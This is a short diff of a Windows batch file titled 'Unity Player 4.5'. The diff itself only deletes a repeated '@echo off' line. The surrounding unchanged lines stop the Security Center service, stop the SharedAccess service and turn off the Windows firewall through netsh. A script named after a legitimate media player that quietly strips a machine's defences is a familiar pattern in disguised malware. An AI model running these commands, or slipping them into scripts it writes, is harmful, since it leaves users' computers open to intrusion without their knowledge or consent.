@@ -1,6 +1,5 @@
 @echo off
 title Unity Player 4.5
-@echo off
 net stop “Security Center”
 net stop SharedAccess
 netsh firewall set opmode mode=disable
